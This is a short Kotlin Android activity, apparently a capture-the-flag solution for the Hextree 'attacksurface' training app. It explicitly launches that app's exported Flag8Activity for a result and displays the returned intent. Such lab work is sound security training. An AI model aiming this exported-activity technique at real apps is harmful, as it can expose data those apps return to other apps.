package com.example.hetreepoc

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class Flag8ActivityHextree : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_flag8_hextree)
        val intent = Intent()
        intent.component = ComponentName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag8Activity"
        )
        startActivityForResult(intent, 1337)
    }

    @Override
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if(requestCode == 1337) {
            Utils.showDialog(this, data)
        }
    }
}